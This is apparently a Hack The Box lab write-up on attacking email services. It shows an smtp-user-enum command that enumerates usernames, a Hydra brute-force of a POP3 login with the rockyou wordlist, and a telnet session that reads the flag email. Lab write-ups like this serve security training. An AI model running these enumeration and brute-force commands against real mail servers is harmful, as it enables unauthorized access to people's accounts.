---
tags:
  - htb
  - linux
  - email
draft: false
date: 2026-06-28
title: attacking-email-services
---

### Q1: What is the available username for the domain inlanefreight.htb in the SMTP server?

First thing that we need to do is adding *target's* ip address to `/etc/hosts` file.

After doing it we can try to enumerate the host:
```
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D inlanefreight.htb -t $ipAddress$
```

After scanning we can find only one valid username.

### Q2: Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

I started by brute-forcing my way in:

```
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt $ipAddress$ pop3 -V
```

After that we can log in:

```
telnet $ipAddress$ 110
USER marlin@inlanefreight.htb
PASS $foundPassword$
```

After successful login we can get the flag:
```
STAT
RETR 1
```
 that way we can obtain the flag.
 